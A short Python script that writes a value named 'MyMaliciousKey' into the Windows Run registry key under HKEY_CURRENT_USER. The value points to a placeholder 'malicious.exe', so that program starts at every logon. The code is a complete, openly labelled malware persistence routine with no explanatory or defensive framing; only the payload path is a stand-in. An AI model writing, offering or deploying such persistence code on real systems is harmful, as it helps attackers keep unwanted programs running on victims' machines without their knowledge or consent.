import winreg as reg

def add_registry_key(path, name, value):
    try:
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(registry_key, name, 0, reg.REG_SZ, value)
        reg.CloseKey(registry_key)
        print(f"Registry key {name} added successfully.")
    except Exception as e:
        print(f"Failed to add registry key: {e}")

if __name__ == "__main__":
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    name = "MyMaliciousKey"
    value = r"C:\path\to\malicious.exe"
    add_registry_key(path, name, value)